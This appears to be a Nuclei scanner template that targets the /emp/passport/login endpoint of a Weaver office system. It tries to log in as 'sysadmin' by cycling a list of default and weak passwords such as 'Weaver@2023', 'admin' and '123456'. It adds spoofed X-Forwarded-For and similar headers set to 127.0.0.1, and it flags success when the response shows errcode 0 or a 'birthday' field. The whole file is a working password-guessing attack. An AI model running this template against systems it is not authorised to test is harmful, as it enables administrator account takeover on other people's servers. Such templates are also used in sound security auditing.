id: need_to_change

info:
  name: need_to_change
  author: msk
  severity: high



http:
  - raw:
      - |
        POST /emp/passport/login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Accept: application/json, text/plain, */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        X-Forwarded-For: 127.0.0.1
        X-Originating-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        Connection: close
        Content-Type: application/json

        {"key":"","loginid":"sysadmin","password":"{{password}}","login_type":2}

    payloads:
      password:
        - 1
        - Weaver@2023
        - Weaver@2022
        - Weaver@2021
        - Weaver@2020
        - Weaver@2019
        - Weaver@2018
        - Weaver#2012!@#
        - Weaver@2017
        - Weaver@2016
        - Weaver@2015
        - Weaver@2014
        - Weaver@2013
        - Weaver@2012
        - Weaver@2011
        - Weaver@2010
        - Weaver@2009
        - Weaver@2008
        - Weaver@2007
        - Weaver@2006
        - Weaver@2005
        - Weaver@2004
        - Weaver@2003
        - Weaver@2002
        - Weaver@2001
        - admin
        - 123456
        - 111111
        
    stop-at-first-match: true
    matchers:
      - type: dsl
        condition: or
        dsl:
          - status_code==200 && contains_all(body,"\"errcode\":0")
          - status_code==200 && contains_all(body,"birthday")